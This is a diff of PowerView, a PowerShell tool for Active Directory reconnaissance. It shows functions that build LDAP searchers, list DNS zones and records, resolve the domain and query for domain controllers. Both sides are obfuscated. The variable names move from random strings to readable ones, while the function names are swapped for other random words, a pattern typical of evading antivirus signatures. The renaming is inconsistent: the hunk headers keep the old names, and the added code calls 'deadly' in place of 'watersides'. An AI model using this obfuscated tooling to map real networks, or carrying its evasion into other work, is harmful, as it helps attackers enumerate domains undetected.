         [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
         [String]
-        $tmZARvdq99,
+        $SecurityMasks,
         [Switch]
-        $rPozaKft99,
+        $Tombstone,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     PROCESS {
         if ($PSBoundParameters['Domain']) {
-            $IayDthuO99 = $SSNUOPgW99
+            $TargetDomain = $Domain
             if ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
-                $ojqqfkye99 = $ENV:USERDNSDOMAIN
-                if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $ojqqfkye99) {
-                    $BUBTRBRP99 = "$($ENV:LOGONSERVER -replace '\\','').$ojqqfkye99"
+                $UserDomain = $ENV:USERDNSDOMAIN
+                if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $UserDomain) {
+                    $BindServer = "$($ENV:LOGONSERVER -replace '\\','').$UserDomain"
                 }
             }
         }
         elseif ($PSBoundParameters['Credential']) {
-            $cCtVoyrZ99 = debater -Credential $gxazvivN99
-            $BUBTRBRP99 = ($cCtVoyrZ99.PdcRoleOwner).Name
-            $IayDthuO99 = $cCtVoyrZ99.Name
+            $DomainObject = southernmost -Credential $Credential
+            $BindServer = ($DomainObject.PdcRoleOwner).Name
+            $TargetDomain = $DomainObject.Name
         }
         elseif ($ENV:USERDNSDOMAIN -and ($ENV:USERDNSDOMAIN.Trim() -ne '')) {
-            $IayDthuO99 = $ENV:USERDNSDOMAIN
-            if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $IayDthuO99) {
-                $BUBTRBRP99 = "$($ENV:LOGONSERVER -replace '\\','').$IayDthuO99"
+            $TargetDomain = $ENV:USERDNSDOMAIN
+            if ($ENV:LOGONSERVER -and ($ENV:LOGONSERVER.Trim() -ne '') -and $TargetDomain) {
+                $BindServer = "$($ENV:LOGONSERVER -replace '\\','').$TargetDomain"
             }
         }
         else {
             write-verbose "get-domain"
-            $cCtVoyrZ99 = debater
-            $BUBTRBRP99 = ($cCtVoyrZ99.PdcRoleOwner).Name
-            $IayDthuO99 = $cCtVoyrZ99.Name
+            $DomainObject = southernmost
+            $BindServer = ($DomainObject.PdcRoleOwner).Name
+            $TargetDomain = $DomainObject.Name
         }
         if ($PSBoundParameters['Server']) {
-            $BUBTRBRP99 = $mSxqoOjK99
+            $BindServer = $Server
         }
-        $nszdDKdM99 = 'LDAP://'
-        if ($BUBTRBRP99 -and ($BUBTRBRP99.Trim() -ne '')) {
-            $nszdDKdM99 += $BUBTRBRP99
-            if ($IayDthuO99) {
-                $nszdDKdM99 += '/'
+        $SearchString = 'LDAP://'
+        if ($BindServer -and ($BindServer.Trim() -ne '')) {
+            $SearchString += $BindServer
+            if ($TargetDomain) {
+                $SearchString += '/'
             }
         }
         if ($PSBoundParameters['SearchBasePrefix']) {
-            $nszdDKdM99 += $hhaBpean99 + ','
+            $SearchString += $SearchBasePrefix + ','
         }
         if ($PSBoundParameters['SearchBase']) {
-            if ($FNgTGwmR99 -Match '^GC://') {
-                $DN = $FNgTGwmR99.ToUpper().Trim('/')
-                $nszdDKdM99 = ''
+            if ($SearchBase -Match '^GC://') {
+                $DN = $SearchBase.ToUpper().Trim('/')
+                $SearchString = ''
             }
             else {
-                if ($FNgTGwmR99 -match '^LDAP://') {
-                    if ($FNgTGwmR99 -match "LDAP://.+/.+") {
-                        $nszdDKdM99 = ''
-                        $DN = $FNgTGwmR99
+                if ($SearchBase -match '^LDAP://') {
+                    if ($SearchBase -match "LDAP://.+/.+") {
+                        $SearchString = ''
+                        $DN = $SearchBase
                     }
                     else {
-                        $DN = $FNgTGwmR99.SubString(7)
+                        $DN = $SearchBase.SubString(7)
                     }
                 }
                 else {
-                    $DN = $FNgTGwmR99
+                    $DN = $SearchBase
                 }
             }
         }
         else {
-            if ($IayDthuO99 -and ($IayDthuO99.Trim() -ne '')) {
-                $DN = "DC=$($IayDthuO99.Replace('.', ',DC='))"
+            if ($TargetDomain -and ($TargetDomain.Trim() -ne '')) {
+                $DN = "DC=$($TargetDomain.Replace('.', ',DC='))"
             }
         }
-        $nszdDKdM99 += $DN
-        Write-Verbose "[watersides] search base: $nszdDKdM99"
-        if ($gxazvivN99 -ne [Management.Automation.PSCredential]::Empty) {
-            Write-Verbose "[watersides] Using alternate credentials for LDAP connection"
-            $cCtVoyrZ99 = New-Object DirectoryServices.DirectoryEntry($nszdDKdM99, $gxazvivN99.UserName, $gxazvivN99.GetNetworkCredential().Password)
-            $TbkLYEaJ99 = New-Object System.DirectoryServices.DirectorySearcher($cCtVoyrZ99)
+        $SearchString += $DN
+        Write-Verbose "[deadly] search base: $SearchString"
+        if ($Credential -ne [Management.Automation.PSCredential]::Empty) {
+            Write-Verbose "[deadly] Using alternate credentials for LDAP connection"
+            $DomainObject = New-Object DirectoryServices.DirectoryEntry($SearchString, $Credential.UserName, $Credential.GetNetworkCredential().Password)
+            $Searcher = New-Object System.DirectoryServices.DirectorySearcher($DomainObject)
         }
         else {
-            $TbkLYEaJ99 = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$nszdDKdM99)
+            $Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
         }
-        $TbkLYEaJ99.PageSize = $mhcqrrQn99
-        $TbkLYEaJ99.SearchScope = $vaSWXjPs99
-        $TbkLYEaJ99.CacheResults = $False
-        $TbkLYEaJ99.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All
+        $Searcher.PageSize = $ResultPageSize
+        $Searcher.SearchScope = $SearchScope
+        $Searcher.CacheResults = $False
+        $Searcher.ReferralChasing = [System.DirectoryServices.ReferralChasingOption]::All
         if ($PSBoundParameters['ServerTimeLimit']) {
-            $TbkLYEaJ99.ServerTimeLimit = $mvTbAWDU99
+            $Searcher.ServerTimeLimit = $ServerTimeLimit
         }
         if ($PSBoundParameters['Tombstone']) {
-            $TbkLYEaJ99.Tombstone = $True
+            $Searcher.Tombstone = $True
         }
         if ($PSBoundParameters['LDAPFilter']) {
-            $TbkLYEaJ99.filter = $HOOTOEqu99
+            $Searcher.filter = $LDAPFilter
         }
         if ($PSBoundParameters['SecurityMasks']) {
-            $TbkLYEaJ99.SecurityMasks = Switch ($tmZARvdq99) {
+            $Searcher.SecurityMasks = Switch ($SecurityMasks) {
                 'Dacl' { [System.DirectoryServices.SecurityMasks]::Dacl }
                 'Group' { [System.DirectoryServices.SecurityMasks]::Group }
                 'None' { [System.DirectoryServices.SecurityMasks]::None }
@@ -1712,36 +1712,36 @@ function watersides {
             }
         }
         if ($PSBoundParameters['Properties']) {
-            $SELixTuO99 = $SdzJuWMG99| ForEach-Object { $_.Split(',') }
-            $Null = $TbkLYEaJ99.PropertiesToLoad.AddRange(($SELixTuO99))
+            $PropertiesToLoad = $Properties| ForEach-Object { $_.Split(',') }
+            $Null = $Searcher.PropertiesToLoad.AddRange(($PropertiesToLoad))
         }
-        $TbkLYEaJ99
+        $Searcher
     }
 }
-function Guinea {
+function grog {
     [OutputType('System.Management.Automation.PSCustomObject')]
     [CmdletBinding()]
     Param(
         [Parameter(Position = 0, Mandatory = $True, ValueFromPipelineByPropertyName = $True)]
         [Byte[]]
-        $yFzHdYsE99
+        $DNSRecord
     )
     BEGIN {
-        function navigational {
+        function reels {
             [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseOutputTypeCorrectly', '')]
             [CmdletBinding()]
             Param(
                 [Byte[]]
                 $Raw
             )
-            [Int]$DAFAeeQd99 = $Raw[0]
-            [Int]$NwwNwAKC99 = $Raw[1]
+            [Int]$Length = $Raw[0]
+            [Int]$Segments = $Raw[1]
             [Int]$Index =  2
             [String]$Name  = ''
-            while ($NwwNwAKC99-- -gt 0)
+            while ($Segments-- -gt 0)
             {
-                [Int]$dPNpuSGi99 = $Raw[$Index++]
-                while ($dPNpuSGi99-- -gt 0) {
+                [Int]$SegmentLength = $Raw[$Index++]
+                while ($SegmentLength-- -gt 0) {
                     $Name += [Char]$Raw[$Index++]
                 }
                 $Name += "."
@@ -1750,82 +1750,82 @@ function Guinea {
         }
     }
     PROCESS {
-        $yIYrDlhm99 = [BitConverter]::ToUInt16($yFzHdYsE99, 2)
-        $GzTCOhMX99 = [BitConverter]::ToUInt32($yFzHdYsE99, 8)
-        $KcJdjLrU99 = $yFzHdYsE99[12..15]
-        $Null = [array]::Reverse($KcJdjLrU99)
-        $TTL = [BitConverter]::ToUInt32($KcJdjLrU99, 0)
-        $Age = [BitConverter]::ToUInt32($yFzHdYsE99, 20)
+        $RDataType = [BitConverter]::ToUInt16($DNSRecord, 2)
+        $UpdatedAtSerial = [BitConverter]::ToUInt32($DNSRecord, 8)
+        $TTLRaw = $DNSRecord[12..15]
+        $Null = [array]::Reverse($TTLRaw)
+        $TTL = [BitConverter]::ToUInt32($TTLRaw, 0)
+        $Age = [BitConverter]::ToUInt32($DNSRecord, 20)
         if ($Age -ne 0) {
-            $Tpwrotbk99 = ((Get-Date -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).AddHours($age)).ToString()
+            $TimeStamp = ((Get-Date -Year 1601 -Month 1 -Day 1 -Hour 0 -Minute 0 -Second 0).AddHours($age)).ToString()
         }
         else {
-            $Tpwrotbk99 = '[static]'
+            $TimeStamp = '[static]'
         }
-        $QLnOLeAL99 = New-Object PSObject
-        if ($yIYrDlhm99 -eq 1) {
-            $IP = "{0}.{1}.{2}.{3}" -f $yFzHdYsE99[24], $yFzHdYsE99[25], $yFzHdYsE99[26], $yFzHdYsE99[27]
+        $DNSRecordObject = New-Object PSObject
+        if ($RDataType -eq 1) {
+            $IP = "{0}.{1}.{2}.{3}" -f $DNSRecord[24], $DNSRecord[25], $DNSRecord[26], $DNSRecord[27]
             $Data = $IP
-            $QLnOLeAL99 | Add-Member Noteproperty 'RecordType' 'A'
+            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'A'
         }
-        elseif ($yIYrDlhm99 -eq 2) {
-            $fXMNCMxJ99 = navigational $yFzHdYsE99[24..$yFzHdYsE99.length]
-            $Data = $fXMNCMxJ99
-            $QLnOLeAL99 | Add-Member Noteproperty 'RecordType' 'NS'
+        elseif ($RDataType -eq 2) {
+            $NSName = reels $DNSRecord[24..$DNSRecord.length]
+            $Data = $NSName
+            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'NS'
         }
-        elseif ($yIYrDlhm99 -eq 5) {
-            $Alias = navigational $yFzHdYsE99[24..$yFzHdYsE99.length]
+        elseif ($RDataType -eq 5) {
+            $Alias = reels $DNSRecord[24..$DNSRecord.length]
             $Data = $Alias
-            $QLnOLeAL99 | Add-Member Noteproperty 'RecordType' 'CNAME'
+            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'CNAME'
         }
-        elseif ($yIYrDlhm99 -eq 6) {
-            $Data = $([System.Convert]::ToBase64String($yFzHdYsE99[24..$yFzHdYsE99.length]))
-            $QLnOLeAL99 | Add-Member Noteproperty 'RecordType' 'SOA'
+        elseif ($RDataType -eq 6) {
+            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
+            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'SOA'
         }
-        elseif ($yIYrDlhm99 -eq 12) {
-            $Ptr = navigational $yFzHdYsE99[24..$yFzHdYsE99.length]
+        elseif ($RDataType -eq 12) {
+            $Ptr = reels $DNSRecord[24..$DNSRecord.length]
             $Data = $Ptr
-            $QLnOLeAL99 | Add-Member Noteproperty 'RecordType' 'PTR'
+            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'PTR'
         }
-        elseif ($yIYrDlhm99 -eq 13) {
-            $Data = $([System.Convert]::ToBase64String($yFzHdYsE99[24..$yFzHdYsE99.length]))
-            $QLnOLeAL99 | Add-Member Noteproperty 'RecordType' 'HINFO'
+        elseif ($RDataType -eq 13) {
+            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
+            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'HINFO'
         }
-        elseif ($yIYrDlhm99 -eq 15) {
-            $Data = $([System.Convert]::ToBase64String($yFzHdYsE99[24..$yFzHdYsE99.length]))
-            $QLnOLeAL99 | Add-Member Noteproperty 'RecordType' 'MX'
+        elseif ($RDataType -eq 15) {
+            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
+            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'MX'
         }
-        elseif ($yIYrDlhm99 -eq 16) {
+        elseif ($RDataType -eq 16) {
             [string]$TXT  = ''
-            [int]$dPNpuSGi99 = $yFzHdYsE99[24]
+            [int]$SegmentLength = $DNSRecord[24]
             $Index = 25
-            while ($dPNpuSGi99-- -gt 0) {
-                $TXT += [char]$yFzHdYsE99[$index++]
+            while ($SegmentLength-- -gt 0) {
+                $TXT += [char]$DNSRecord[$index++]
             }
             $Data = $TXT
-            $QLnOLeAL99 | Add-Member Noteproperty 'RecordType' 'TXT'
+            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'TXT'
         }
-        elseif ($yIYrDlhm99 -eq 28) {
-            $Data = $([System.Convert]::ToBase64String($yFzHdYsE99[24..$yFzHdYsE99.length]))
-            $QLnOLeAL99 | Add-Member Noteproperty 'RecordType' 'AAAA'
+        elseif ($RDataType -eq 28) {
+            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
+            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'AAAA'
         }
-        elseif ($yIYrDlhm99 -eq 33) {
-            $Data = $([System.Convert]::ToBase64String($yFzHdYsE99[24..$yFzHdYsE99.length]))
-            $QLnOLeAL99 | Add-Member Noteproperty 'RecordType' 'SRV'
+        elseif ($RDataType -eq 33) {
+            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
+            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'SRV'
         }
         else {
-            $Data = $([System.Convert]::ToBase64String($yFzHdYsE99[24..$yFzHdYsE99.length]))
-            $QLnOLeAL99 | Add-Member Noteproperty 'RecordType' 'UNKNOWN'
+            $Data = $([System.Convert]::ToBase64String($DNSRecord[24..$DNSRecord.length]))
+            $DNSRecordObject | Add-Member Noteproperty 'RecordType' 'UNKNOWN'
         }
-        $QLnOLeAL99 | Add-Member Noteproperty 'UpdatedAtSerial' $GzTCOhMX99
-        $QLnOLeAL99 | Add-Member Noteproperty 'TTL' $TTL
-        $QLnOLeAL99 | Add-Member Noteproperty 'Age' $Age
-        $QLnOLeAL99 | Add-Member Noteproperty 'TimeStamp' $Tpwrotbk99
-        $QLnOLeAL99 | Add-Member Noteproperty 'Data' $Data
-        $QLnOLeAL99
+        $DNSRecordObject | Add-Member Noteproperty 'UpdatedAtSerial' $UpdatedAtSerial
+        $DNSRecordObject | Add-Member Noteproperty 'TTL' $TTL
+        $DNSRecordObject | Add-Member Noteproperty 'Age' $Age
+        $DNSRecordObject | Add-Member Noteproperty 'TimeStamp' $TimeStamp
+        $DNSRecordObject | Add-Member Noteproperty 'Data' $Data
+        $DNSRecordObject
     }
 }
-function dunces {
+function mourned {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.DNSZone')]
     [CmdletBinding()]
@@ -1833,82 +1833,82 @@ function dunces {
         [Parameter(Position = 0, ValueFromPipeline = $True)]
         [ValidateNotNullOrEmpty()]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $SdzJuWMG99,
+        $Properties,
         [ValidateRange(1, 10000)]
         [Int]
-        $mhcqrrQn99 = 200,
+        $ResultPageSize = 200,
         [ValidateRange(1, 10000)]
         [Int]
-        $mvTbAWDU99,
+        $ServerTimeLimit,
         [Alias('ReturnOne')]
         [Switch]
-        $QtcSidjx99,
+        $FindOne,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     PROCESS {
-        $PPosolen99 = @{
+        $SearcherArguments = @{
             'LDAPFilter' = '(objectClass=dnsZone)'
         }
-        if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
-        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['Properties']) { $PPosolen99['Properties'] = $SdzJuWMG99 }
-        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
-        $HFtHDwCo99 = watersides @SearcherArguments
-        if ($HFtHDwCo99) {
-            if ($PSBoundParameters['FindOne']) { $pfqXXMQd99 = $HFtHDwCo99.FindOne()  }
-            else { $pfqXXMQd99 = $HFtHDwCo99.FindAll() }
-            $pfqXXMQd99 | Where-Object {$_} | ForEach-Object {
-                $Out = Buddy -Properties $_.Properties
+        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
+        $DNSSearcher1 = deadly @SearcherArguments
+        if ($DNSSearcher1) {
+            if ($PSBoundParameters['FindOne']) { $Results = $DNSSearcher1.FindOne()  }
+            else { $Results = $DNSSearcher1.FindAll() }
+            $Results | Where-Object {$_} | ForEach-Object {
+                $Out = bookie -Properties $_.Properties
                 $Out | Add-Member NoteProperty 'ZoneName' $Out.name
                 $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')
                 $Out
             }
-            if ($pfqXXMQd99) {
-                try { $pfqXXMQd99.dispose() }
+            if ($Results) {
+                try { $Results.dispose() }
                 catch {
-                    Write-Verbose "[wheezes] Error disposing of the Results object: $_"
+                    Write-Verbose "[throwaways] Error disposing of the Results object: $_"
                 }
             }
-            $HFtHDwCo99.dispose()
+            $DNSSearcher1.dispose()
         }
-        $PPosolen99['SearchBasePrefix'] = 'CN=MicrosoftDNS,DC=DomainDnsZones'
-        $zAtSHbmC99 = watersides @SearcherArguments
-        if ($zAtSHbmC99) {
+        $SearcherArguments['SearchBasePrefix'] = 'CN=MicrosoftDNS,DC=DomainDnsZones'
+        $DNSSearcher2 = deadly @SearcherArguments
+        if ($DNSSearcher2) {
             try {
-                if ($PSBoundParameters['FindOne']) { $pfqXXMQd99 = $zAtSHbmC99.FindOne() }
-                else { $pfqXXMQd99 = $zAtSHbmC99.FindAll() }
-                $pfqXXMQd99 | Where-Object {$_} | ForEach-Object {
-                    $Out = Buddy -Properties $_.Properties
+                if ($PSBoundParameters['FindOne']) { $Results = $DNSSearcher2.FindOne() }
+                else { $Results = $DNSSearcher2.FindAll() }
+                $Results | Where-Object {$_} | ForEach-Object {
+                    $Out = bookie -Properties $_.Properties
                     $Out | Add-Member NoteProperty 'ZoneName' $Out.name
                     $Out.PSObject.TypeNames.Insert(0, 'PowerView.DNSZone')
                     $Out
                 }
-                if ($pfqXXMQd99) {
-                    try { $pfqXXMQd99.dispose() }
+                if ($Results) {
+                    try { $Results.dispose() }
                     catch {
-                        Write-Verbose "[dunces] Error disposing of the Results object: $_"
+                        Write-Verbose "[mourned] Error disposing of the Results object: $_"
                     }
                 }
             }
             catch {
-                Write-Verbose "[dunces] Error accessing 'CN=MicrosoftDNS,DC=DomainDnsZones'"
+                Write-Verbose "[mourned] Error accessing 'CN=MicrosoftDNS,DC=DomainDnsZones'"
             }
-            $zAtSHbmC99.dispose()
+            $DNSSearcher2.dispose()
         }
     }
 }
-function misinterpret {
+function cookery {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.DNSRecord')]
     [CmdletBinding()]
@@ -1916,57 +1916,57 @@ function misinterpret {
         [Parameter(Position = 0,  Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
         [ValidateNotNullOrEmpty()]
         [String]
-        $lZtKKPNg99,
+        $ZoneName,
         [ValidateNotNullOrEmpty()]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [ValidateNotNullOrEmpty()]
         [String[]]
-        $SdzJuWMG99 = 'name,distinguishedname,dnsrecord,whencreated,whenchanged',
+        $Properties = 'name,distinguishedname,dnsrecord,whencreated,whenchanged',
         [ValidateRange(1, 10000)]
         [Int]
-        $mhcqrrQn99 = 200,
+        $ResultPageSize = 200,
         [ValidateRange(1, 10000)]
         [Int]
-        $mvTbAWDU99,
+        $ServerTimeLimit,
         [Alias('ReturnOne')]
         [Switch]
-        $QtcSidjx99,
+        $FindOne,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     PROCESS {
-        $PPosolen99 = @{
+        $SearcherArguments = @{
             'LDAPFilter' = '(objectClass=dnsNode)'
-            'SearchBasePrefix' = "DC=$($lZtKKPNg99),CN=MicrosoftDNS,DC=DomainDnsZones"
+            'SearchBasePrefix' = "DC=$($ZoneName),CN=MicrosoftDNS,DC=DomainDnsZones"
         }
-        if ($PSBoundParameters['Domain']) { $PPosolen99['Domain'] = $SSNUOPgW99 }
-        if ($PSBoundParameters['Server']) { $PPosolen99['Server'] = $mSxqoOjK99 }
-        if ($PSBoundParameters['Properties']) { $PPosolen99['Properties'] = $SdzJuWMG99 }
-        if ($PSBoundParameters['ResultPageSize']) { $PPosolen99['ResultPageSize'] = $mhcqrrQn99 }
-        if ($PSBoundParameters['ServerTimeLimit']) { $PPosolen99['ServerTimeLimit'] = $mvTbAWDU99 }
-        if ($PSBoundParameters['Credential']) { $PPosolen99['Credential'] = $gxazvivN99 }
-        $TlmRHcNz99 = watersides @SearcherArguments
-        if ($TlmRHcNz99) {
-            if ($PSBoundParameters['FindOne']) { $pfqXXMQd99 = $TlmRHcNz99.FindOne() }
-            else { $pfqXXMQd99 = $TlmRHcNz99.FindAll() }
-            $pfqXXMQd99 | Where-Object {$_} | ForEach-Object {
+        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
+        $DNSSearcher = deadly @SearcherArguments
+        if ($DNSSearcher) {
+            if ($PSBoundParameters['FindOne']) { $Results = $DNSSearcher.FindOne() }
+            else { $Results = $DNSSearcher.FindAll() }
+            $Results | Where-Object {$_} | ForEach-Object {
                 try {
-                    $Out = Buddy -Properties $_.Properties | Select-Object name,distinguishedname,dnsrecord,whencreated,whenchanged
-                    $Out | Add-Member NoteProperty 'ZoneName' $lZtKKPNg99
+                    $Out = bookie -Properties $_.Properties | Select-Object name,distinguishedname,dnsrecord,whencreated,whenchanged
+                    $Out | Add-Member NoteProperty 'ZoneName' $ZoneName
                     if ($Out.dnsrecord -is [System.DirectoryServices.ResultPropertyValueCollection]) {
-                        $ZSBUvEpO99 = Guinea -DNSRecord $Out.dnsrecord[0]
+                        $Record = grog -DNSRecord $Out.dnsrecord[0]
                     }
                     else {
-                        $ZSBUvEpO99 = Guinea -DNSRecord $Out.dnsrecord
+                        $Record = grog -DNSRecord $Out.dnsrecord
                     }
-                    if ($ZSBUvEpO99) {
-                        $ZSBUvEpO99.PSObject.Properties | ForEach-Object {
+                    if ($Record) {
+                        $Record.PSObject.Properties | ForEach-Object {
                             $Out | Add-Member NoteProperty $_.Name $_.Value
                         }
                     }
@@ -1974,57 +1974,57 @@ function misinterpret {
                     $Out
                 }
                 catch {
-                    Write-Warning "[misinterpret] Error: $_"
+                    Write-Warning "[cookery] Error: $_"
                     $Out
                 }
             }
-            if ($pfqXXMQd99) {
-                try { $pfqXXMQd99.dispose() }
+            if ($Results) {
+                try { $Results.dispose() }
                 catch {
-                    Write-Verbose "[misinterpret] Error disposing of the Results object: $_"
+                    Write-Verbose "[cookery] Error disposing of the Results object: $_"
                 }
             }
-            $TlmRHcNz99.dispose()
+            $DNSSearcher.dispose()
         }
     }
 }
-function debater {
+function southernmost {
     [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
     [CmdletBinding()]
     Param(
         [Parameter(Position = 0, ValueFromPipeline = $True)]
         [ValidateNotNullOrEmpty()]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     PROCESS {
         if ($PSBoundParameters['Credential']) {
-            Write-Verbose '[debater] Using alternate credentials for debater'
+            Write-Verbose '[southernmost] Using alternate credentials for southernmost'
             if ($PSBoundParameters['Domain']) {
-                $IayDthuO99 = $SSNUOPgW99
+                $TargetDomain = $Domain
             }
             else {
-                $IayDthuO99 = $gxazvivN99.GetNetworkCredential().Domain
-                Write-Verbose "[debater] Extracted domain '$IayDthuO99' from -Credential"
+                $TargetDomain = $Credential.GetNetworkCredential().Domain
+                Write-Verbose "[southernmost] Extracted domain '$TargetDomain' from -Credential"
             }
-            $KFJNQbJm99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $IayDthuO99, $gxazvivN99.UserName, $gxazvivN99.GetNetworkCredential().Password)
+            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $TargetDomain, $Credential.UserName, $Credential.GetNetworkCredential().Password)
             try {
-                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($KFJNQbJm99)
+                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
             }
             catch {
-                Write-Verbose "[debater] The specified domain '$IayDthuO99' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
+                Write-Verbose "[southernmost] The specified domain '$TargetDomain' does not exist, could not be contacted, there isn't an existing trust, or the specified credentials are invalid: $_"
             }
         }
         elseif ($PSBoundParameters['Domain']) {
-            $KFJNQbJm99 = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $SSNUOPgW99)
+            $DomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext('Domain', $Domain)
             try {
-                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($KFJNQbJm99)
+                [System.DirectoryServices.ActiveDirectory.Domain]::GetDomain($DomainContext)
             }
             catch {
-                Write-Verbose "[debater] The specified domain '$SSNUOPgW99' does not exist, could not be contacted, or there isn't an existing trust : $_"
+                Write-Verbose "[southernmost] The specified domain '$Domain' does not exist, could not be contacted, or there isn't an existing trust : $_"
             }
         }
         else {
@@ -2032,12 +2032,12 @@ function debater {
                 [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
             }
             catch {
-                Write-Verbose "[debater] Error retrieving the current domain: $_"
+                Write-Verbose "[southernmost] Error retrieving the current domain: $_"
             }
         }
     }
 }
-function deplorably {
+function Sarto {
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
     [OutputType('PowerView.Computer')]
     [OutputType('System.DirectoryServices.ActiveDirectory.DomainController')]
@@ -2045,35 +2045,35 @@ function deplorably {
     Param(
         [Parameter(Position = 0, ValueFromPipeline = $True)]
         [String]
-        $SSNUOPgW99,
+        $Domain,
         [ValidateNotNullOrEmpty()]
         [Alias('DomainController')]
         [String]
-        $mSxqoOjK99,
+        $Server,
         [Switch]
         $LDAP,
         [Management.Automation.PSCredential]
         [Management.Automation.CredentialAttribute()]
-        $gxazvivN99 = [Management.Automation.PSCredential]::Empty
+        $Credential = [Management.Automation.PSCredential]::Empty
     )
     PROCESS {
-        $vScLHGBn99 = @{}
-        if ($PSBoundParameters['Domain']) { $vScLHGBn99['Domain'] = $SSNUOPgW99 }
-        if ($PSBoundParameters['Credential']) { $vScLHGBn99['Credential'] = $gxazvivN99 }
+        $Arguments = @{}
+        if ($PSBoundParameters['Domain']) { $Arguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Credential']) { $Arguments['Credential'] = $Credential }
         if ($PSBoundParameters['LDAP'] -or $PSBoundParameters['Server']) {
-            if ($PSBoundParameters['Server']) { $vScLHGBn99['Server'] = $mSxqoOjK99 }
-            $vScLHGBn99['LDAPFilter'] = '(userAccountControl:1.2.840.113556.1.4.803:=8192)'
-            doubtlessly @Arguments
+            if ($PSBoundParameters['Server']) { $Arguments['Server'] = $Server }
